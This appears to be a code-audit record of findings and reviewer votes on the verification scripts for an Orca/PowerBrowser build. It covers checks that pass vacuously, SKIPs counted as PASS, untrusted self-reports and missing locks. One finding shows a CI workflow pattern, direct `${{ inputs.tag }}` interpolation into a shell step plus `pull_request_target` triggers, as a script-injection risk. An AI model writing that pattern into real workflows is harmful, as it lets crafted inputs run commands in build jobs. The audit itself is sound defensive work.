findings.description: The claim is that Orca's tracked files differ from the pin in exactly the declared seams. The check compares the path set from `git status --porcelain --untracked-files=no` with the seams.json paths. A seam path edited to any content other than the patch result still passes. Untracked or ignored additions to the orca/ tree are excluded by --untracked-files=no. orca-pane-entry clause b compares status text to a baseline file that the build itself wrote, which has the same limit.
findings.scenario: A build-time step or a postinstall script in a pinned npm dependency rewrites a declared seam file such as the browser-provider with different content. Status still lists the same M path, so both checks pass. Other tracked files edited after the pre-build baseline would be caught, but a seam path is not.
findings.evidence: verify-orca-build-shape.mjs:142-146: `const path = line.trim().split(/\s+/).pop(); seen.add(path); if (seamPaths.includes(path)) modified++; else fails.push(...)`. The only seam content proof is apply-patches.sh, run during the build, not here.
findings.preconditions: Something other than apply-patches.sh modifies a declared seam path after the overlay is applied.
findings.suggested_fix: Compare `git -C orca hash-object <seam path>` with the blob that applying the patch to the recorded upstream_blob yields. Derive that blob at check time from the recorded blob plus the patch, as the overlay replay already does.

votes.reasoning: verify-orca-build-shape.mjs:140-146 compares only the set of paths from git status --porcelain --untracked-files=no against seams.json. A seam path with different content still passes, and untracked additions are excluded. Content correctness of seams is proven only in apply-patches.sh during the build. The precondition (something else rewrites a seam file) is narrow, so this is hardening.
votes.guard_or_evidence: scripts/verify-orca-build-shape.mjs:140-149

findings.title: orca-overlay treats an absent seams.json, patches/ or files/ as zero seams and passes
findings.description: If orca-overlay/ or seams.json is deleted, rows = [] and the patch and file lists are empty. The check passes with "0 seam(s), 0 overlay file(s)". The seam cap is only an upper bound, and orca-build-shape derives its seam list from the same file, so it is equally satisfied. An overlay that silently vanishes, such as the browser-provider seam and the pane bundle files the product depends on, produces no red row in the quick or full tier. Only --upstream-prs and the live rows would notice, and --upstream-prs crashes on JSON.parse when the file is missing.
findings.scenario: A bad merge or an accidental `git rm -r orca-overlay` removes the overlay. orca-overlay, orca-build-shape, orca-overlay-built ("vacuous at zero files") and the self-tests all pass; only live rows fail much later.
findings.evidence: verify-orca-overlay.mjs:157-169 (`// a. seams.json ... An absent file is zero seams.` `if (existsSync(seamsFile)) {...}`) and renderBuilt line 356 `PASS -- 0 overlay file(s): vacuous until the first PB-added file lands`.
findings.preconditions: The overlay directory or seams.json is removed.
findings.suggested_fix: Fail when seams.json is absent. Compare the derived overlay against a derived requirement, for example that every orca-overlay/files path referenced by theia/extensions/orca-panes exists. Remove the "vacuous" PASS for orca-overlay-built once the first overlay file has landed.

votes.reasoning: verify-orca-overlay.mjs:156-169 treats a missing seams.json as rows = []. renderBuilt prints PASS for 0 overlay files (line 356). A deleted overlay therefore does not turn these rows red. Other quick rows that read overlay files may catch it, and an overlay deletion is a large, visible diff, which limits the impact.
votes.guard_or_evidence: scripts/verify-orca-overlay.mjs:157-169, 350-358

findings.title: orca-no-pb-add-project cannot go red for any PowerBrowser project or folder control that is not an exact normalised match of an Orca string, and SKIPs its self-test when typescript is absent
findings.description:
The header claims PowerBrowser adds no "Add-project, folder-picker or project control". The check only fails when a PB command, menu, toolbar or keybinding string normalises to equal an Orca translate() default that matched /add (a )?project/i, or one inside the add-repo-opening function. A PB command labelled "Add Folder", "Open Folder", "New Project", "Add Workspace" or "Choose Repository", or a label built from a constant, template or import, passes. No folder-picker vocabulary is derived at all.
Separately, main() and --self-test both exit 0 with SKIP when theia/node_modules/typescript is absent (line 339), before the self-test runs. The self-test fixture is hermetic and does not need typescript present on disk, only a loadable one.
findings.scenario: A developer adds a command with label 'Open Folder...' or 'New Project' to a Theia extension. The vocabulary comparison finds no equal string and the row is green. In an environment without typescript both rows print SKIP.
findings.evidence: verify-orca-no-pb-add-project.mjs:55 `const ADD_PROJECT = /add (a )?project/i;` and :209-210 `const v = vocabByNorm.get(normalise(p.text)); if (v) fails.push(...)`. :339 `if (!loadTypeScript()) { console.log(`...SKIP -- theia/node_modules/typescript is absent...`); process.exit(0); }` precedes the --self-test dispatch at :340.
findings.preconditions: A PB control whose text differs from Orca's exact strings, or a run without a Theia install.
findings.suggested_fix: Broaden the derived vocabulary to Orca's folder-picker and add-repo dialog strings, not only the /add project/ pattern. Flag any PB registration whose label matches a derived project/folder/repo noun. Run the self-test on the fixture even when typescript is missing, or fail it when CI=true.

votes.reasoning: check() fails only when normalise(p.text) equals a vocabulary string derived from Orca's add-project strings (lines 209-210). A PB control labelled 'Open Folder' or 'New Project', or built from a constant or template, is not matched. The self-test is dispatched after the typescript SKIP at line 339 (the dispatch is at line 340), so without typescript both rows print SKIP and exit 0. The check is scoped to D-18's Add-project string and is a heuristic, which limits the impact. In hosted CI the row also SKIPs because orca/ is absent.
votes.guard_or_evidence: scripts/verify-orca-no-pb-add-project.mjs:55, 209-210, 339-340

findings.title: Three checks guard their CLI entry point with a symlink-sensitive comparison; when it misses, the script does nothing and exits 0
findings.description: landing-selectors compares `import.meta.url === pathToFileURL(process.argv[1]).href`. pane-css compares `resolve(process.argv[1]) === fileURLToPath(import.meta.url)`, at line 153. pane-entry does the same through INVOKED, at line 612. Node realpaths the ESM main module for import.meta.url but leaves process.argv[1] as typed, so any symlinked component in REPO_ROOT makes the guard false. The script then falls through with no output and exit 0, for both the check and --self-test. The other scripts in the shard use realpathSync on both sides. The canonical path in CLAUDE.md is under /home/chris/coding, which is not a symlink today.
findings.scenario: The checkout is reached through a symlinked directory (a convenience link to the workspace). `node $REPO_ROOT/scripts/verify-orca-landing-selectors.mjs` prints nothing and exits 0, so the landing selector gate and its self-test never run.
findings.evidence: verify-orca-landing-selectors.mjs:215-221 `if (import.meta.url === pathToFileURL(process.argv[1]).href) { ... process.exit(...) }` with no else branch; verify-orca-pane-css.mjs:152-157 `const SELF = fileURLToPath(import.meta.url); if (process.argv[1] && resolve(process.argv[1]) === SELF) {...}`.
findings.preconditions: The scripts are invoked through a path containing a symlink.
findings.suggested_fix: Use the realpathSync(resolve(argv[1])) === realpathSync(fileURLToPath(import.meta.url)) form already used by sibling checks, and make a false guard print a FAIL and exit 2 when the file was run as a script.

votes.reasoning: verify-orca-landing-selectors.mjs:215 compares import.meta.url to pathToFileURL(process.argv[1]).href, with no else branch. pane-css:152-157 and pane-entry:612 compare resolve(argv[1]) to fileURLToPath(import.meta.url). Node realpaths the ESM main module, so a symlinked path component makes the guard false and the script exits 0 silently. The canonical checkout path is not a symlink today, so this is a latent hardening gap.
votes.guard_or_evidence: scripts/verify-orca-landing-selectors.mjs:215-221; scripts/verify-orca-pane-css.mjs:152-157; scripts/verify-orca-pane-entry.mjs:612

findings.title: orca-slotless-start trusts orcad's self-reported boundEndpoint for the loopback requirement, and can leak the terminal daemon when orcad fails before its ready line
findings.description:
Loopback bind is proven only by orcad's own ready line, which is the subject. It is not compared with /proc/net/tcp or the listening sockets of the process tree. A defect that reports ws://127.0.0.1 while listening on 0.0.0.0 passes. The only independent control is the `--bind 127.0.0.1` argument this script itself passes in startOrcad.
On the failure path, probeOrcad catches a startOrcad rejection and sets run.child = e.child but run.ready stays null. The terminal daemon pid is only known from the ready line. stopOrcad is called with daemonPid null, so the daemon that orcad may have spawned is not stopped by this script. The driver's leak leg later names an orcad that is still in the row's session.
The row also SKIPs whenever an installed Orca exists in the real ~/.local/bin, even though orcad itself runs under liveEnv's scratch HOME.
findings.scenario: An Orca re-pin changes how --bind is honoured. Orcad reports 127.0.0.1 but binds all interfaces. The row stays green.
findings.evidence: verify-orca-slotless-start.mjs:97 `if (!ready.boundEndpoint?.startsWith('ws://127.0.0.1:'))`; :224-228 `catch (e) { run.child = e.child ?? null; fails.push(...); return; }` followed by :198-200 `const daemonPid = run.ready?.daemonPid ?? null; ... stopOrcad(run.child, daemonPid)`.
findings.preconditions: An orcad bind bug that misreports its endpoint, or a startup failure after the daemon starts.
findings.suggested_fix: After the ready line, read /proc/net/tcp and /proc/net/tcp6 for the listener inode of the orcad pid and require every listening address to be 127.0.0.1 or ::1. On a startOrcad failure, scan the process tree for descendants (descendants() already exists) and stop them as well.

votes.reasoning: checkReady (verify-orca-slotless-start.mjs:96-99) validates only the self-reported boundEndpoint; no /proc/net/tcp or socket check exists, so a misreporting orcad passes. probeOrcad's catch (line ~224) sets run.child but leaves run.ready null, so the finally block calls stopOrcad with daemonPid null. checkSurvivors would still report survivors if stopOrcad does not reap the tree, so the leak is partly detected rather than silent. The installed-Orca SKIP uses the real home (skipReason, ~line 133). Hardening gap only.
votes.guard_or_evidence: scripts/verify-orca-slotless-start.mjs:96-99, 198-200, 224-228; the self-test 'bind 0.0.0.0' at :359 exercises only the string check.

findings.title: verify-upstream-pins' new rebase-orca.yml rules ban a schedule key and defaults, but do not assert the trigger set or script-injection safety
findings.description: workflowFailures for rebase-orca.yml requires workflow_dispatch and workflow_call with tag and commit inputs. It also requires no default, no schedule key, no pin literal, and replay inside nix develop .#orca. It does not assert that those are the only triggers, and does not forbid `${{ inputs.* }}` inside a run: body. Today the workflow reads the inputs through env (REBASE_TAG, REBASE_COMMIT), which is safe, but nothing keeps it that way. Adding `pull_request`, `pull_request_target` or `push` to the on: block, or interpolating inputs directly into the shell, still passes. This workflow clones and builds a third-party tree.
findings.scenario: A contributor adds `pull_request_target:` to rebase-orca.yml, or changes the replay step to `bash scripts/rebase-orca.sh --tag ${{ inputs.tag }}`. The pin check stays green, and a fork pull request or a crafted input then reaches a build job that clones and runs third-party code.
findings.evidence: verify-upstream-pins.mjs:293-301 loops `for (const trigger of WORKFLOW_TRIGGERS)` checking presence only, then `if (directChild(lines, on, 'schedule') !== -1)`. Nothing enumerates the children of `on`. The d) literal check at ~:326 only scans for tag or commit literals.
findings.preconditions: A change to rebase-orca.yml's triggers or run steps.
findings.suggested_fix: Require the set of direct children of `on` to equal {workflow_dispatch, workflow_call}, derived from the file and compared as set equality. Fail any `${{ inputs.` or `${{ github.event.` inside a run: body (allow only env: and with: contexts). Add one plant for each.

votes.reasoning: workflowFailures checks that workflow_dispatch and workflow_call are present, that no schedule key exists, that inputs have no default, that commands run in nix shells, and that no tag or commit literals appear. It never enumerates the children of on:, and it does not scan run: bodies for inputs interpolation. Adding pull_request_target or interpolating ${{ inputs.* }} into a run step would pass. The path needs a maintainer-written change to the workflow, so this is a hardening gap, not an outsider-reachable flaw.
votes.guard_or_evidence: scripts/verify-upstream-pins.mjs:277-335 contains no trigger-set equality and no injection rule.

findings.title: Fixture git commits in several self-tests inherit the developer's global git config
findings.description: Fixture repositories are committed with only -c user.name and -c user.email set. They inherit the user's global and system git config: commit.gpgsign, gpg.program, core.hooksPath, core.fsmonitor, init.templateDir and similar. With commit.gpgsign=true the self-test can invoke the signing agent or fail. A global core.hooksPath runs the user's hooks inside the throwaway repositories. verify-orca-pin.mjs shows the intended form (-c commit.gpgsign=false -c tag.gpgsign=false).
findings.scenario: A developer with commit.gpgsign=true and a pinentry-protected key runs --quick. The self-tests for orca-overlay, orca-build-shape, orca-pane-entry and orca-editor-routes hang or fail on a GPG prompt, or run the developer's global pre-commit hook against a fixture.
findings.evidence: verify-orca-overlay.mjs:302 `git(replay, '-c', 'user.name=replay', '-c', 'user.email=replay@invalid', 'commit', ...)` and :379; verify-orca-build-shape.mjs:183; verify-orca-pane-entry.mjs:511; verify-orca-editor-routes.mjs:429. None disables signing or hooks.
findings.preconditions: Developer machine with signing or hooks configured globally.
findings.suggested_fix: Route fixture git calls through one helper that adds `-c commit.gpgsign=false -c tag.gpgsign=false -c core.hooksPath=/dev/null` and sets GIT_CONFIG_GLOBAL=/dev/null and GIT_CONFIG_NOSYSTEM=1.

votes.reasoning: The fixture commits in verify-orca-overlay.mjs:302 and :379, verify-orca-build-shape.mjs:183, verify-orca-pane-entry.mjs:511 and verify-orca-editor-routes.mjs:429-434 set only user.name and user.email. None sets commit.gpgsign=false or core.hooksPath. verify-orca-pin.mjs:238 does set gpgsign=false, so the omission is inconsistent. Overlay and editor-routes use withoutGitVars, which strips only GIT_* env vars, not the global config files. Impact is limited to developer machines with signing or hooks configured globally.
votes.guard_or_evidence: No gpgsign or hooksPath override found in those files; only verify-orca-pin.mjs:238 has one.

findings.title: orca-bridge-dir verifies the writePrivateFile permission order with unanchored regexes over text, so a dead or conditional step still satisfies it
findings.description: The A-11 order (0700 folder, exclusive empty create, 0600 before content, move) is checked by running each regex against the method body after stripping only full-line // comments. A step in a never-taken branch, a trailing // comment, or a string literal still matches. The self-test only plants removal or reordering of the exact existing text. The header acknowledges that modes on disk are proven only by the live row. This is a credential-adjacent file (the data-root hand-off).
findings.scenario: A refactor moves the setPermissions call into an `if (false)` or an early-returned branch. Every regex still matches in the right order and the check stays green, while the file is written with the default umask mode.
findings.evidence: verify-orca-bridge-dir.mjs:158-166 STEPS regexes and :172 `const code = body.split('\n').filter((l) => !/^\s*\/\//.test(l)).join('\n');` with matching by `re.exec(code)` and no AST or control-flow check.
findings.preconditions: A refactor that preserves the text but changes control flow.
findings.suggested_fix: Parse the member with the TypeScript or acorn AST. Require the calls as top-level awaited statements of the method, in order, and not inside an if other than the `posix` guard. Add a plant that wraps the 0600 call in `if (false)`.

votes.reasoning: orderVerdict (verify-orca-bridge-dir.mjs:~168-190) strips only lines that begin with //, then runs the STEPS regexes with re.exec over the text. Regexes are not anchored to control flow, so a setPermissions call in a dead or conditional branch still matches. The header says on-disk modes are proven only by the live row, which is a mitigating control. The scenario needs a refactor that preserves the text but changes control flow.
votes.guard_or_evidence: scripts/verify-orca-bridge-dir.mjs:158-180; the live row is the stated backstop.

findings.title: Decoy clause (f) of orca-browser-agent-live cannot go red: liveEnv replaces the decoy HOME, so PB's orcad never sees ~/.local/bin/orca-ide
findings.description: Clause (f) (P66-29) is meant to prove that PB's orcad does not launch an installed Orca. The check plants a decoy at <scratch HOME>/.local/bin/orca-ide and sets process.env.HOME to that folder before the launch. Every launch then passes through liveEnv(). liveEnv() treats realHomes() as the real home, and realHomes() includes os.homedir(), which on POSIX returns the current $HOME. At launch time $HOME is the decoy folder, so inRealHome(decoyHome) is true and HOME is replaced with liveHome() (.mozbuild/pb-live-profiles/pb-home-*). That folder has no decoy. PowerBrowser, orcad (HOME is on ORCAD_ENV_ALLOWLIST) and the CLI all run without the decoy. markerPresent can only be false. No assertion compares orcad's /proc environ HOME with the decoy folder, so nothing catches this.
findings.scenario: A regression drops ORCAD_HIDDEN_ELECTRON_SWITCH from buildOrcadEnv, so PB's orcad would start an installed Orca desktop. In orca-browser-agent-live the stock half still passes in its own process tree (its HOME is under XDG_RUNTIME_DIR, so it is kept). The PB half runs with HOME=pb-home-*, which holds no orca-ide, so no PROFILE_RECORD_FILE appears and clause (f) prints 'no decoy'. The row PASSes.
findings.evidence:
scripts/lib/orca-browser-live.mjs:181 `if (home) process.env.HOME = home;`
scripts/lib/firefox-bidi.mjs:67-71 `return [...new Set([homedir(), pw]...` (homedir() reads $HOME)
scripts/lib/firefox-bidi.mjs:73-76 `return homes.some(h => within(p, h)) && !within(p, HARNESS_SCRATCH);`
scripts/lib/firefox-bidi.mjs:194 `if (inRealHome(out.HOME)) out.HOME = liveHome();`
scripts/lib/firefox-bidi.mjs:698 spawn `{ env: liveEnv(env) }` with env = process.env
scripts/verify-orca-browser-agent-live.mjs:820-824 decoy home made with mkdtempSync(tmpdir()) and passed as withBrowserSession({ home })
scripts/verify-orca-browser-agent-live.mjs:920 `markerPresent: roots.some((r) => existsSync(join(r, recordFile)))`; verdictDecoy (228-236) has no HOME positive read.
findings.suggested_fix: Compute realHomes() once at module load from the passwd entry and the original $HOME, before any row changes process.env.HOME. Alternatively, have withBrowserSession pass the decoy HOME through an explicit env override that liveEnv keeps. In clause (f), add a positive read: /proc/<orcad>/environ HOME must equal the decoy folder, or the clause is 'detector blind'. Add a self-test plant for that.
findings.preconditions: None beyond running the row. It happens on every run that reaches clause (f) with the stock half passing.

votes.reasoning:
I traced the whole path myself.

1. The decoy setup is as described. liveRun (scripts/verify-orca-browser-agent-live.mjs:820-822) makes `home = mkdtempSync(join(tmpdir(), 'pb-agent-home-'))`, puts the decoy at home/.local/bin/orca-ide, and calls withBrowserSession({ log, home }).

2. withBrowserSession sets `process.env.HOME = home` (scripts/lib/orca-browser-live.mjs:181) before withOrcaTabsSession -> withProbeShell -> withFirefoxPage launches PowerBrowser. withFirefoxPage builds `env` from process.env and spawns with `{ env: liveEnv(env) }` (scripts/lib/firefox-bidi.mjs:686-698).

3. liveEnv (firefox-bidi.mjs:192-203) runs `if (inRealHome(out.HOME)) out.HOME = liveHome();`. inRealHome (73-77) defaults to `homes = realHomes()`, and realHomes (67-71) includes Node's os.homedir(). On POSIX, os.homedir() reads the current $HOME, which is now the decoy folder. So `within(decoy, decoy)` is true. The decoy is under tmpdir(), not under <repo>/.mozbuild, so the HARNESS_SCRATCH exemption does not apply. HOME becomes liveHome(), a fresh .mozbuild/pb-live-profiles/pb-home-* folder (144-166) with no .local/bin/orca-ide. The CLI is affected the same way: its cliEnv takes HOME from process.env.HOME (orca-browser-live.mjs:192), and liveEnv(cliEnv) at line 197 replaces it too. So PowerBrowser, and the orcad it spawns, never see the decoy.

4. Nothing checks this. verdictDecoy (verify-orca-browser-agent-live.mjs:228-236) looks at stock.pass, createOk, the title, the quiet window and markerPresent. markerPresent (920) only checks whether the record file exists under orcad's data roots. Nothing reads orcad's real HOME or confirms that the decoy was on its search path. The self-test only plants `markerPresent: true` into the observation object (1078), so it tests the verdict function, not the live wiring. The stock half runs in a separate process tree (hiddenElectronRun), so it still passes.

5. Result: if the hidden-Electron switch regresses, PB's orcad launches no decoy, because there is no decoy in its HOME. Clause (f) prints 'no decoy' and the row passes.

This is a security regression check that cannot go red in its intended case, so high under the rubric. Nothing I found in DECISIONS.md accepts this. The scratch-HOME ruling explains why liveEnv exists, but it does not exempt this check.
votes.guard_or_evidence: scripts/lib/firefox-bidi.mjs:194 (HOME replaced because realHomes() at :67-71 includes homedir(), which equals the decoy set at scripts/lib/orca-browser-live.mjs:181); scripts/verify-orca-browser-agent-live.mjs:920 and :228-236 (markerPresent is the only decoy read, with no positive HOME check)

findings.title: orca-browser-agent-live and orca-agent-mark-live exit 0 (counted PASS) when tree markers or build outputs are missing, and when the decoy clause skips
findings.description: The driver counts a row as PASS on exit status 0 alone (verify-platform.sh:6978-6986). prerequisites() returns a SKIP, and both rows then exit 0, when any of these hold: a regex `const AGENT_METHODS =` does not match PowerBrowserAPI.sys.mjs; theia/extensions/orca-browser does not exist; the built host bundle orca/out/web/assets/pb-panes/pb-browser-host.js is missing; or any tabsPrerequisites condition holds (no orca-panes dir, no Theia build, no orcad.js, no panes bundle). These are no longer lane-merge states. A rename of the constant, or an Orca build that fails to emit the host bundle, turns the agent-ability rows green. Clause (f) has a separate skip: when an installed Orca exists at /usr/bin, /usr/local/bin or /opt/Orca, the row prints 'PASS -- ... (f) SKIP' and exits 0. The self-test even asserts that a skipped (f) yields no failures.
findings.scenario: A refactor renames AGENT_METHODS to AGENT_COMMANDS in PowerBrowserAPI.sys.mjs, or scripts/build-orca.sh stops copying pb-browser-host.js. The full run or --gate runs orca-browser-agent-live and orca-agent-mark-live. Both print 'SKIP -- lane p66-03 not merged' or 'lane p66-01 not merged or Orca not built' and exit 0. The summary shows PASS. The checks covering tab scope, container isolation, downloads, protocols, clipboard and the agent mark do not run.

findings.suggested_fix: Remove the lane-merge skips, since the lanes are merged. When a merged-tree marker or build output is missing, return FAIL with a next step. Give a skip a distinct exit status (for example 77) and make the driver record it as SKIP, not PASS, so --gate requires an exclusion entry. When the decoy stock half skips, report clause (f) as FAIL or as a distinct non-PASS state.
findings.preconditions: A rename of AGENT_METHODS or of the extension folder, a missing host bundle (see the failure-page finding), or a system-wide Orca install for clause (f).

votes.reasoning:
I traced each step myself.

1. prerequisites() in scripts/lib/orca-browser-live.mjs:53-64 returns a skip in four cases: the regex /\bconst AGENT_METHODS\s*=/ does not match, theia/extensions/orca-browser is absent, the Firefox binary is absent, or orca/out/web/assets/pb-panes/pb-browser-host.js is absent. It then defers to orca-tabs-live.mjs's prerequisites(), which also skips when orca-panes, the Theia build, orcad.js or the panes bundle is missing.
2. verify-orca-browser-agent-live.mjs:1001 and verify-orca-agent-mark-live.mjs:115 print SKIP and return 0 when that happens.
3. verify-platform.sh:6976-6986 decides a row only by its wait status, plus the leak leg. Nothing after line 7000 treats SKIP output differently, and --gate adds only the WINDOWS.md exclusions. So a skipped row shows as "PASS" in the summary. Both rows are registered at verify-platform.sh:6894-6895.
4. Clause (f): at line 911, when the stock half skipped (verify-orca-hidden-electron.mjs:225 skips if an installed Orca exists at the derived system paths), obs.f is set to a skip. The row then prints the SKIP line and still exits 0 with "(f) SKIP" in its PASS line. The self-test at line 1177 checks that a skipped (f) gives zero failures and exactly one named skip.

All of this matches the finding.

Two points lower the severity from high.

First, the AGENT_METHODS rename scenario does not turn the whole run green. Two rows in the --quick set (which starts at verify-platform.sh:3659) fail on it:
- orca-browser-abilities (registered at 4060) fails at verify-orca-browser-abilities.mjs:252 when AGENT_METHODS is missing while the tab-scope file exists.
- orca-browser-tab-scope (registered at 4079) reports a broken instrument at verify-orca-browser-tab-scope.mjs:387.
The two live rows still show PASS, but the run as a whole goes red.

Second, a host bundle that fails to build does not produce this state. build-orca.sh and build-orca-browser-host.sh both run under set -euo pipefail (build-orca.sh:39, build-orca-browser-host.sh:22), so a failed build stops the script. The state appears only if step 10 is removed from build-orca.sh or its output stops being written. In that case orca-browser-host-bundle also skips with exit 0 (header lines 35-36), so the path to an all-green run is real.

The checks can go red when their prerequisites hold. That rules out "a security check that cannot go red". This is a harness gap: a named SKIP counts as PASS in full and --gate runs, and nothing requires these rows to actually run on a tree that is merged and built. That is a gap with a concrete path (removing build step 10), which puts it at medium. The installed-Orca skip of (f) is deliberate and printed by name, but it still counts as a pass on hosts with a system-wide Orca install. No such install exists on this host.
votes.guard_or_evidence: scripts/lib/orca-browser-live.mjs:56-63 (skip conditions); scripts/verify-orca-browser-agent-live.mjs:1001 and :911/:1015 (exit 0, (f) SKIP inside PASS); scripts/verify-orca-agent-mark-live.mjs:115; scripts/verify-platform.sh:6978-6986 (exit status alone decides PASS). Partial mitigation of the rename case: scripts/verify-orca-browser-abilities.mjs:252 and scripts/verify-orca-browser-tab-scope.mjs:387 (quick rows at verify-platform.sh:4060/4079). The host bundle is not otherwise guarded: scripts/verify-orca-browser-host-bundle.mjs:35 also skips.

findings.title: Other live rows exit 0 on SKIP and the driver counts them PASS (credential store, no remote port, service, failure page, snapshot, agent status)
findings.description: Apart from the known agent-status sign-in case, these exit-0 SKIP paths exist in the assigned rows. verify-orca-credential-store-live skips with no binary, no orcad.js, or no theia/node_modules/typescript; the last is plausible when PB_FIREFOX_BIN points at another checkout. verify-no-remote-agent-port-live skips the live row, and its --self-test skips the live half but prints PASS, both with no binary or orcad. verify-orca-service-live and verify-orca-failure-page-live skip with no binary or Orca build; failure-page also skips when the orca-failure-copy.ts path moves. verify-orca-browser-snapshot-live skips with no binary, orcad or fixture manifest. The quick row orca-snapshot-fixtures skips without orca/package.json, which is every CI job that does not fetch orca/. verify-orca-agent-status-live skips with no claude on PATH, and with any seedClaudeLogin refusal: no sign-in, an API-key setup, or under 60 min to expiry. All of these print SKIP and exit 0, and verify-platform.sh records PASS. Three of these rows guard security requirements: the credential store (RUN-09), no remote agent port (D-11) and the failure classes.
findings.scenario: A developer runs `scripts/verify-platform.sh --gate` from a worktree whose theia/node_modules is not installed, with PB_FIREFOX_BIN pointing at the main checkout's binary. orca-credential-store-live prints 'SKIP -- theia/node_modules/typescript is not installed' and the summary shows 'orca-credential-store-live: PASS'. The plaintext-override and temporary-profile refusals are never exercised. In CI without orca/, orca-snapshot-fixtures is always PASS.

findings.title: failure-page-live moves the built pb-browser-host.js aside and does not restore it when ended by SIGTERM, which makes the agent-browser rows SKIP and PASS
findings.description: Induction 5 renames the shared build output orca/out/web/assets/pb-panes/pb-browser-host.js to *.pb-aside and restores it in a finally block. The script calls liveEnv(), which installs liveHome()'s SIGTERM and SIGHUP handlers. Those handlers dispose the scratch HOME and re-raise the signal with the default disposition, so the finally block never runs. verify-platform.sh stops a running check with SIGTERM to its process group (setsid row, cleanup). The host bundle stays moved aside. The next orca-browser-agent-live and orca-agent-mark-live runs then hit prerequisites()' `HOST_BUNDLE_REL is absent` SKIP and pass. They run before failure-page in registry order (lines 6894-6895 against 6907). The next failure-page run then fails on ENOENT and only after that restores the file. A concurrent unlocked run (see the lock finding) also sees the file missing during induction 5.
findings.scenario: The owner interrupts a --gate run (Ctrl-C, or the driver's group SIGTERM) during failure-page launch 3. pb-browser-host.js is left as pb-browser-host.js.pb-aside. On the re-run, orca-browser-agent-live prints 'SKIP -- lane p66-01 not merged or Orca not built (...pb-browser-host.js is absent)' and exits 0, so it counts as PASS. The live browser host is also broken for manual use until the next failure-page run restores the file.
findings.evidence:
scripts/verify-orca-failure-page-live.mjs:486 `renameSync(join(REPO_ROOT, HOST_BUNDLE_REL), hostAside);`
:509 `if (existsSync(hostAside)) renameSync(hostAside, join(REPO_ROOT, HOST_BUNDLE_REL));` (finally only)
scripts/lib/firefox-bidi.mjs:155-163 signal handler: `disposeHome(home); process.off(sig, onSignal); process.kill(process.pid, sig);`
scripts/lib/orca-browser-live.mjs:60 skip on missing host bundle
findings.suggested_fix: Do not mutate the shared build tree. Induce browser-not-attached by pointing a pref or the orca root at a scratch copy of out/web without the host bundle. Otherwise register a synchronous restore in the SIGTERM, SIGINT and SIGHUP path, and restore any stale *.pb-aside at the start of every row that reads HOST_BUNDLE_REL. In any case, make a missing host bundle FAIL in prerequisites().
findings.preconditions: The row is ended by a signal during induction 5, or another live row runs at the same time.

votes.reasoning: Line 486 renames orca/out/web/assets/pb-panes/pb-browser-host.js to *.pb-aside. It is restored only at 495 (inside the session) or in the finally at 509. failure-page calls liveEnv (lines 306, 322, and through withShell/withFirefoxPage), so liveHome() installs handlers for SIGINT, SIGTERM and SIGHUP (firefox-bidi.mjs:155-163). No other SIGTERM listener exists in pb-relaunch or firefox-bidi: the only other process.on calls are SIGINT at firefox-bidi.mjs:585 and 764, and that handler also ends with process.exit(130), which skips finally blocks. On SIGTERM the liveHome handler disposes the HOME, removes itself and re-raises with the default disposition, so the process dies without running the finally. verify-platform.sh cleanup() sends `kill -- -$CURRENT_CHECK_PID` to the setsid group, and that group includes the flock child and the re-exec'd node (spawnSync children share the group). prerequisites() in orca-browser-live.mjs:60 then skips on the same HOST_BUNDLE_REL, and browser-agent-live:1001 and agent-mark-live:115 return 0 for that skip. Registry order 6894-6895 runs before 6907. On the next run, failure-page's skipReason checks only that the pb-panes directory exists, so the run proceeds, fails at the rename, and the finally restores the file.
votes.guard_or_evidence: scripts/lib/firefox-bidi.mjs:156-162 `if (process.listenerCount(sig) > 1) return; disposeHome(home); process.off(sig, onSignal); process.kill(process.pid, sig);`; scripts/verify-platform.sh:139-143 group SIGTERM; scripts/lib/orca-browser-live.mjs:60 skip on missing host bundle

findings.title: Seven live rows claim to run 'under flock pb-live.lock' but neither they nor the driver take the lock
findings.description: verify-orca-credential-store-live, verify-sidecar-origin-gate-live and verify-orca-failure-page-live re-exec themselves under flock <git common dir>/pb-live.lock. Seven assigned rows do not, although their headers say they run under it: browser-agent-live, agent-mark-live, browser-snapshot-live, agent-status-live, no-remote-agent-port-live, service-live and packaged-live. The registry invokes them as plain `node ...`, and verify-platform.sh contains no flock call. Concurrent sessions on one checkout are a documented condition of this project. Without the lock these rows interleave with the locking rows. Two cases: failure-page's host-bundle rename (the finding above) and its SIGSTOP of an orcad. The rows also wipe fixed scratch paths: snapshot-live runs `rmSync(work)` on .mozbuild/orca-browser-snapshot-live, status-live removes the fixed .mozbuild/orca-agent-status-live/repo, and service-live removes .mozbuild/orca-service-live/repo. A second run of the same row deletes the first run's repository while orcad is using it.
findings.scenario: Session A runs `--only orca-failure-page-live` (locked). Session B runs `--only orca-browser-agent-live` at the same time. B is not blocked. If B starts during A's induction 5, B SKIPs and passes. Or two sessions run orca-agent-status-live together: the second removes the shared repo folder under the first's live claude, and the first run fails or measures the wrong session records.
findings.evidence:
grep: no spawnSync('flock'/PB_LIVE_LOCK_HELD in verify-orca-browser-agent-live.mjs, verify-orca-agent-mark-live.mjs, verify-orca-browser-snapshot-live.mjs, verify-orca-agent-status-live.mjs, verify-no-remote-agent-port-live.mjs, verify-orca-service-live.mjs, verify-orca-packaged-live.mjs; none in verify-platform.sh or scripts/lib.
scripts/verify-orca-agent-status-live.mjs:45-46 'Run under the live lock'
scripts/verify-orca-browser-snapshot-live.mjs:335 `rmSync(work, { recursive: true, force: true });`
scripts/verify-orca-agent-status-live.mjs:215 fixed `repo` path, 317 `rmSync(repo, ...)`
scripts/verify-platform.sh:6894-6895 `"orca-browser-agent-live|node $REPO_ROOT/scripts/verify-orca-browser-agent-live.mjs"`
findings.suggested_fix: Take the lock in one place: a shared helper in scripts/lib that every live row calls at entry (re-exec under flock unless PB_LIVE_LOCK_HELD=1), or have verify-platform.sh wrap every full-tier live row in flock. Use mkdtemp scratch repositories instead of fixed paths.
findings.preconditions: Two live runs on the same checkout at the same time.

